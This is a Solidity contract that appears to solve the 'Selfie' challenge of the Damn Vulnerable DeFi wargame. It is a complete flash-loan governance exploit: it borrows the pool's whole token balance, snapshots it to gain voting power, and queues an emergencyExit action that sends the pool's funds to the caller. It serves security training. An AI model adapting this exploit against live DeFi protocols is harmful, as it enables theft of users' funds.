// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import "./SelfiePool.sol";

contract SelfieAttack is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");

    SelfiePool public pool;
    SimpleGovernance public governance;
    DamnValuableTokenSnapshot public token;

    constructor(address poolAddress, address governanceAddress) {
        pool = SelfiePool(poolAddress);
        governance = SimpleGovernance(governanceAddress);
        token = DamnValuableTokenSnapshot(address(pool.token()));
    }

    function onFlashLoan(address, address, uint256, uint256, bytes calldata data) external override returns (bytes32) {
        token.snapshot();
        governance.queueAction(address(pool), 0, data);
        return CALLBACK_SUCCESS;
    }

    function attack() public {
        uint256 amount = token.balanceOf(address(pool));
        token.approve(address(pool), amount);
        pool.flashLoan(this, address(token), amount, abi.encodeWithSignature("emergencyExit(address)", msg.sender));
    }
}
